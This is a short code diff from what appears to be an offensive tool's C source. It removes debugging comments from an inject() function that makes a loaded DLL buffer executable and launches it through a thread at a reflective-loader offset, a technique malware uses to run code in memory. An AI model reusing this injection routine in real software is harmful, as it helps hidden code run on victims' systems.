@@ -509,13 +509,6 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     DWORD dwOldProtect;
     ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-    // TODO: Something crashing the app here
-    // the message box pops up for a split second
-    // If you put it under waitforsingleobject
-    // it doesn't show up
-    // The poc (modules/poc/inject.c) works
-    // In the poc, the offset of RL is 3318, but here it's 35368
-    // It's probably because GetRLOffset is giving an incorrect address
     HANDLE hThread = ((CREATETHREAD)api->CreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)loaderOffset, NULL, 0, NULL);
     ((WAITFORSINGLEOBJECT)api->WaitForSingleObject)(hThread, INFINITE);
     ((CLOSEHANDLE)api->CloseHandle)(hThread);
